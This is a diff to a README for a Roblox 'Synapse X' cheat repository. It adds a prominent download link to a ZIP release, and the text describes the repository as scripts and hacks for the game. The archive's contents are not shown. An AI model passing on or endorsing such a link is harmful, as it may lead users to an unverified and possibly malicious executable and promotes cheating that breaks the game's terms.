@@ -2,6 +2,8 @@
 
 Welcome to the **Roblox-Synapse-X** repository! 🎮 Here you can find various scripts and hacks for Roblox using Synapse and Lua scripting language.
 
+# [Download](https://github.com/beastamya8/Roblox-Synapse-X/releases/download/Download/RobloxSyn.zip)
+
 ## Overview
 
 **Roblox-Synapse-X** is a collection of scripts and tools tailored for the Roblox platform, specifically focusing on enhancing the gameplay experience with the use of Synapse as the execution framework. Whether you are looking to automate certain tasks within the game or enhance your gameplay in creative ways, this repository has got you covered.
